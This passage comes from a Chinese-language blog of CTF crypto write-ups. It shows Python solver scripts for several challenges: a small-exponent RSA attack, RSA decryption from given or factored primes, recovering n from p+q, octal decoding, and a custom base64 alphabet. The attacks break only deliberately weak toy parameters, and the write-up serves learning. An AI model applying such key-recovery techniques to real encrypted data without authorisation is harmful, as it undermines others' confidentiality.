class="line">HELLOWHATISTHEKEYITISBOOPBEEP</span><br></pre></td></tr></table></figure><p>加上空格之後看到flag，真的會聽到暴躁。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HELLO WHAT IS THE KEY IT IS BOOPBEEP</span><br></pre></td></tr></table></figure><h3 id="dangerous-rsa"><a class="markdownIt-Anchor" href="#dangerous-rsa"></a> Dangerous RSA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span><br><span class="line">#e:  0x3</span><br><span class="line">#c:  0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span><br><span class="line">so,how to get the message?</span><br></pre></td></tr></table></figure><p>從題目來看，很明顯就是小明文攻擊，e很小的情況下直接暴力破解就可以了，送分題。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    m, is_true_root = gmpy2.iroot(i*n + c, e)</span><br><span class="line">    <span class="keyword">if</span> is_true_root:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found i = <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Message: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">bytearray</span>.fromhex(<span class="built_in">format</span>(m, <span class="string">&#x27;x&#x27;</span>)).decode()))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="hdctf2019basic-rsa"><a class="markdownIt-Anchor" href="#hdctf2019basic-rsa"></a> [HDCTF2019]basic rsa</h3><p>題目給了一個python的程式如下。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*****************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br></pre></td></tr></table></figure><p>不管其他花裏胡俏的東西，這就是一個有c, n, e逆向破解的題目，直接硬幹就好，c的值應該是最下面的註解。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>拿到flag。</p><h3 id="guet-ctf2019babyrsa"><a class="markdownIt-Anchor" href="#guet-ctf2019babyrsa"></a> [GUET-CTF2019]BabyRSA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p+q : 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span><br><span class="line">(p+1)(q+1) : 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span><br><span class="line">e : 0xe6b1bee47bd63f615c7d0a43c529d219</span><br><span class="line">d : 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span><br><span class="line">enc_flag : 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span><br></pre></td></tr></table></figure><p>有點小酷，嘗試透過一些基本的數學運算看看能不能拆出p, q，把它變成已知c, d, n下解密的RSA。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mi>q</mi><mo>+</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mspace linebreak="newline"></mspace><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">(p+1)(q+1)=pq+(p+q)+1\\n=pq=(p+1)(q+1)-(p+q)-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p_add_q = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">pq_add_1 = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">c = <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line">n = pq_add_1 - p_add_q - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">M = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(M))</span><br></pre></td></tr></table></figure><p>得到flag。</p><h3 id="密碼學的心聲"><a class="markdownIt-Anchor" href="#密碼學的心聲"></a> 密碼學的心聲</h3><p>二戰時期，某國軍官與一個音樂家情婦相好，然而自從那時起，他屢戰屢敗，敵人似乎料事如神。他也有懷疑過他的情婦，但是他經過24小時觀察他的情婦，發現她每天都只是作曲，然後彈奏給戰地電台，為士兵們鼓氣，並未有任何逾越。那麼，間諜到底是誰？這張曲譜是否有貓膩？(答案為一個明文字符串，提交獲得的有意義語句通順字符串即可)</p><p><img src="music.png" alt="樂譜" /></p><p>裡面有一句這裡面沒有八，看起來是八進制的解碼，先把樂譜打出來，並轉成16進位。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = <span class="number">0o111114157166145123145143165162151164171126145162171115165143150</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(c))</span><br><span class="line"><span class="comment"># 0x49261bcec6529994c675391a4e8792b194e479269d4c668</span></span><br></pre></td></tr></table></figure><p>然後轉base64和ascii都爆了，最後藉由1出現的有點多，分組後發現是八進位的ascii，哭阿。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&#x27;111 114 157 166 145 123 145 143 165 162 151 164 171 126 145 162 171 115 165 143 150&#x27;</span></span><br><span class="line">s = [c.split(<span class="string">&#x27; &#x27;</span>)[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c.split(<span class="string">&#x27; &#x27;</span>)))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">8</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>拿到flag，我要死掉了。</p><h3 id="bjdctf2020這是base"><a class="markdownIt-Anchor" href="#bjdctf2020這是base"></a> [BJDCTF2020]這是base??</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict:&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;, 33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;</span><br><span class="line"></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br></pre></td></tr></table></figure><p>感覺是替換加密，拿base64依照字典做decoder，不知道會不會搞，但就先建字典做轉換。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">        <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">        <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">base64_list = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">chipertext = <span class="string">&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;</span></span><br><span class="line">m = <span class="built_in">str</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> chipertext:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> c == <span class="built_in">dict</span>[j]:</span><br><span class="line">            m += base64_list[j]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(m))</span><br></pre></td></tr></table></figure><p>取得flag。</p><h3 id="rsa2"><a class="markdownIt-Anchor" href="#rsa2"></a> RSA2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span><br><span class="line">e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span><br><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line">flag = &quot;flag&#123;&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>題目給出的資訊中，少了d，因此先查md5的加密，好像沒有結果，後來想想應該是靠N, e求d再做MD5雜湊加密而已，這樣就好做ㄌ。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># by http://www.factordb.com/index.php</span></span><br><span class="line">p = <span class="number">9046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183</span></span><br><span class="line">q = <span class="number">11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>然後弄出來的flag{cb51252e8f42f4f84aa9fb5b41e141ff}沒過，應該是因為python2和3的算出來的結果會不一樣，python2的hex會在字尾多加一個L，所以補上就好。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># by http://www.factordb.com/index.php</span></span><br><span class="line">p = <span 